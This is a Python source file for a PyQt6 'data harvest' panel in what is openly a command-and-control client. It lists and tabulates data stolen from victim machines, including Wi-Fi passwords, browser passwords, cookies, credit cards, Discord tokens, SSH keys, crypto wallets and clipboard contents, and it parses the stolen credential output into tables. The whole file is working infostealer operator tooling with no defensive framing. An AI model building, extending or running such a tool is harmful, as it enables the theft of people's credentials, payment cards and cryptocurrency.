# C2_Client/ui/data_harvest_pane.py
import re
from PyQt6.QtWidgets import (QWidget, QHBoxLayout, QListWidget, QStackedWidget, 
                             QVBoxLayout, QTableWidget, QTextEdit, 
                             QHeaderView, QTableWidgetItem, QAbstractItemView)
from PyQt6.QtCore import Qt

class DataHarvestPane(QWidget):
    
    def __init__(self):
        super().__init__()
        
        main_layout = QHBoxLayout(self)
        
        left_pane_widget = QWidget()
        left_pane_layout = QVBoxLayout(left_pane_widget)
        left_pane_layout.setContentsMargins(0,0,0,0)
        left_pane_widget.setFixedWidth(240)

        self.category_list = QListWidget()
        self.categories = [
            "1. OS Version & Build", "2. System Architecture", "3. CPU Model", "4. GPU Model(s)",
            "5. Installed RAM", "6. Disk Drives", "7. Hostname", "8. User Accounts", "9. System Uptime",
            "10. Running Processes", "11. Installed Apps", "12. Security Products", "13. Environment Variables",
            "14. Private IP", "15. Public IP", "16. MAC Address", "17. Wi-Fi Passwords", "18. Active Connections",
            "19. ARP Table", "20. DNS Cache", "21. Browser Passwords", "22. Browser Cookies",
            "24. Discord Tokens", "25. Telegram Session", "26. FileZilla Credentials", "27. Pidgin Credentials",
            "28. SSH Keys", "29. Browser Credit Cards", "30. Crypto Wallets", "31. Sensitive Documents",
            "32. Browser History", "33. Browser Autofill", "34. Clipboard Contents"
        ]
        self.category_list.addItems(self.categories)
        left_pane_layout.addWidget(self.category_list)
        main_layout.addWidget(left_pane_widget)
        
        self.content_stack = QStackedWidget()
        main_layout.addWidget(self.content_stack, 1)
        
        # --- UI MAPPING: Switched more views to tables for better readability ---
        self.view_map = {
            "1. OS Version & Build": self._create_text_view(), "2. System Architecture": self._create_text_view(),
            "3. CPU Model": self._create_text_view(), "4. GPU Model(s)": self._create_text_view(is_mono=True),
            "5. Installed RAM": self._create_text_view(), "6. Disk Drives": self._create_text_view(is_mono=True),
            "7. Hostname": self._create_text_view(), "8. User Accounts": self._create_text_view(is_mono=True),
            "9. System Uptime": self._create_text_view(), "10. Running Processes": self._create_text_view(is_mono=True),
            "11. Installed Apps": self._create_text_view(is_mono=True), "12. Security Products": self._create_text_view(is_mono=True),
            "13. Environment Variables": self._create_text_view(is_mono=True), "14. Private IP": self._create_text_view(),
            "15. Public IP": self._create_text_view(), "16. MAC Address": self._create_text_view(),
            "17. Wi-Fi Passwords": self._create_table(["SSID", "Password"]),
            "18. Active Connections": self._create_text_view(is_mono=True), "19. ARP Table": self._create_text_view(is_mono=True),
            "20. DNS Cache": self._create_text_view(is_mono=True),
            "21. Browser Passwords": self._create_table(["Source", "URL", "Username", "Password"]),
            "22. Browser Cookies": self._create_table(["Source", "Host", "Name", "Value"]), # Now a table
            "24. Discord Tokens": self._create_text_view(is_mono=True),
            "25. Telegram Session": self._create_text_view(),
            "26. FileZilla Credentials": self._create_table(["Host", "User", "Password"]),
            "27. Pidgin Credentials": self._create_table(["Protocol", "User", "Password"]),
            "28. SSH Keys": self._create_text_view(is_mono=True),
            "29. Browser Credit Cards": self._create_table(["Source", "Name on Card", "Expires", "Card Number"]),
            "30. Crypto Wallets": self._create_text_view(), "31. Sensitive Documents": self._create_text_view(is_mono=True),
            "32. Browser History": self._create_table(["Source", "Title", "URL"]), # Now a table
            "33. Browser Autofill": self._create_table(["Source", "Field Name", "Value"]), # Now a table
            "34. Clipboard Contents": self._create_text_view(is_mono=True)
        }
        
        self.ordered_keys = list(self.view_map.keys())
        for key in self.ordered_keys: self.content_stack.addWidget(self.view_map[key])
        self.category_list.currentItemChanged.connect(self.on_category_change)
        if self.category_list.count() > 0: self.category_list.setCurrentRow(0)

    def on_category_change(self, current_item):
        if not current_item: return
        self.content_stack.setCurrentWidget(self.view_map[self.ordered_keys[self.category_list.row(current_item)]])

    def _create_text_view(self, is_mono=False):
        text_edit = QTextEdit(); text_edit.setReadOnly(True)
        if is_mono: text_edit.setFontFamily("Consolas")
        return text_edit

    def _create_table(self, headers):
        table = QTableWidget(); table.setColumnCount(len(headers)); table.setHorizontalHeaderLabels(headers)
        table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
        table.horizontalHeader().setStretchLastSection(True); table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows); table.verticalHeader().setVisible(False)
        table.setSortingEnabled(True); return table

    def clear_all_views(self):
        for view in self.view_map.values():
            if isinstance(view, QTextEdit): view.setText("Awaiting data...")
            elif isinstance(view, QTableWidget): view.setRowCount(0)

    def update_view(self, module_name, data_packet):
        view = self.view_map.get(module_name)
        if not view: return
        payload = data_packet.get("output", {}).get("data", "No data found for this module.")
        
        # --- NEW PARSERS for the enhanced payload output ---
        parsers = {
            "17. Wi-Fi Passwords": (re.findall(r"SSID:\s*(.*?)\nPassword:\s*(.*)", payload), self._populate_table_from_tuples),
            "21. Browser Passwords": (re.findall(r"\[(.*?)\]\n\s*URL: (.*?)\n\s*User: (.*?)\n\s*Pass: (.*?)\n", payload), self._populate_table_from_tuples),
            "22. Browser Cookies": (re.findall(r"\[(.*?)\]\n\s*Host: (.*?)\n\s*Name: (.*?)\n\s*Value: (.*?)\n", payload), self._populate_table_from_tuples),
            "26. FileZilla Credentials": (re.findall(r"Host:\s*(.*?)\nUser:\s*(.*?)\nPass:\s*(.*?)\n", payload), self._populate_table_from_tuples),
            "27. Pidgin Credentials": (re.findall(r"Protocol:\s*(.*?)\nUser:\s*(.*?)\nPass:\s*(.*?)\n", payload), self._populate_table_from_tuples),
            "29. Browser Credit Cards": (re.findall(r"\[(.*?)\]\n\s*Name: (.*?)\n\s*Expires: (.*?)\n\s*Number: (.*?)\n", payload), self._populate_table_from_tuples),
            "32. Browser History": (re.findall(r"\[(.*?)\]\n\s*Title: (.*?)\n\s*URL: (.*?)\n", payload), self._populate_table_from_tuples),
            "33. Browser Autofill": (re.findall(r"\[(.*?)\]\n\s*Field: (.*?)\n\s*Value: (.*?)\n", payload), self._populate_table_from_tuples),
        }
        
        if module_name in parsers:
            parsed_data, handler = parsers[module_name]
            handler(view, parsed_data)
        elif isinstance(view, QTextEdit):
            view.setText(str(payload))

    def _populate_table_from_tuples(self, table, data_list):
        table.setSortingEnabled(False)
        table.setRowCount(0)
        
        if not data_list:
            table.setRowCount(1)
            item = QTableWidgetItem("No data found for this module.")
            item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
            table.setItem(0, 0, item)
            if table.columnCount() > 1:
                table.setSpan(0, 0, 1, table.columnCount())
        else:
            table.setRowCount(len(data_list))
            for row_idx, row_data in enumerate(data_list):
                for col_idx, cell_data in enumerate(row_data):
                    table.setItem(row_idx, col_idx, QTableWidgetItem(str(cell_data).strip()))
            table.resizeColumnsToContents()
        
        table.setSortingEnabled(True)